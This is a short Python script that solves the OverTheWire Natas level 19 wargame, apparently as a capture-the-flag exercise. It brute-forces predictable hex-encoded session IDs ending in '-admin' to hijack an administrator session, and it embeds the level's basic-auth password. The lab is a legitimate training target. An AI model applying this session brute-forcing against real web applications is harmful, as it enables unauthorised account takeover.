import base64
from datetime import datetime
import requests
import pprint

TARGET_URL = 'http://natas19.natas.labs.overthewire.org/index.php?debug=1'

AUTH = ('natas19', '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs')

for i in xrange(1, 640):
    try:
        sess_id = ''.join(map(lambda c: hex(ord(c))[2:], str(i)+'-admin'))
        r = requests.post(TARGET_URL, data={}, auth=AUTH, cookies={'PHPSESSID':sess_id}, timeout=5)
        if r.status_code == 200:
            if 'You are an admin' in r.text:
                print r.text
                break
        else:
            print r
    except Exception as e:
        print e
